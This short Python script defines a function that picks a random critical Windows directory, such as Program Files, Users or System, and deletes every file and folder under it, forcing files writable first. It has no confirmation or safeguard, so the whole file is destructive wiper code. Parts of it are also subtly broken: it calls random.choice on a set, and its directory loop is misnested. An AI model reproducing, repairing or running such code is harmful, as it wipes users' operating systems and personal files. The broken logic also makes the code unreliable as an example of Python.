import os
import random
import stat
importantDirectoryArray = {"Program Files\\", "Program Files (x86)\\", "ProgramData\\","Users\\", "Windows\\SysWOW64\\", "Windows\\System\\", "Windows\\System" }



def deleteFiles():#credit: http://stackoverflow.com/questions/2656322/python-shutil-rmtree-fails-on-windows-with-access-is-denied
    rootDirectionary = "C:\\"+random.choice(importantDirectoryArray)
    for root, dirs, files in os.walk(rootDirectionary):
        for name in files:
            filename = os.path.join(root, name)
            os.chmod(filename, stat.S_IWUSR)
            os.remove(filename)
            for name in dirs:
                os.rmdir(os.path.join(root, name))      
    
        